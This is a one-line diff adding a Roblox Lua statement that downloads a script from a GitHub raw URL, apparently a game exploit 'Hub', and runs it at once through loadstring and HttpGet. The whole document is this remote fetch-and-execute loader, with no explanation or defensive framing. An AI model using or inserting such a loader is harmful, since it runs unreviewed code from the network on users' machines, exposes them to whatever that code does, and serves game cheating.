@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PopCat0881/PopCat0881/main/RipBaller12306Hub.lua"))()
